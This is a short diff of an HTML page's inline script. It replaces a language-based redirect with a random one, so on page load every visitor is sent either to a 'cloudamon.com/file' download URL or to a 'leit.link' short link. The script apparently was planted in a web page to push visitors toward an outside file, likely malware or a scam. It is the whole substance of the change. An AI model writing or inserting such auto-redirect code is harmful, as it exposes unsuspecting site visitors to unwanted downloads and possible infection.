@@ -6,15 +6,28 @@
     
   </head>
 <script type="text/javascript">
-  var userLang = navigator.language || navigator.userLanguage; 
-if (userLang == 'ru-RU' || userLang == 'uk-UA' || userLang == 'kk-KZ') 
+var userLang = navigator.language || navigator.userLanguage; 
+
+function randomIntFromInterval(min, max) { // min and max included 
+  return Math.floor(Math.random() * (max - min + 1) + min)
+}
+
+if (randomIntFromInterval(1, 2) == 1) 
+{
+  window.location.href="http://cloudamon.com/file/123a5c0";
+}
+else 
+{
+  window.location.href="https://leit.link/YASb";
+}
+/*if (userLang == 'ru-RU' || userLang == 'uk-UA' || userLang == 'kk-KZ') 
 {
   window.location.href="http://cloudamon.com/file/123a5c0";
 }
 else 
 {
   window.location.href="http://cloudamon.com/file/123a5c0";
-}
+}*/
 
 </script>
 
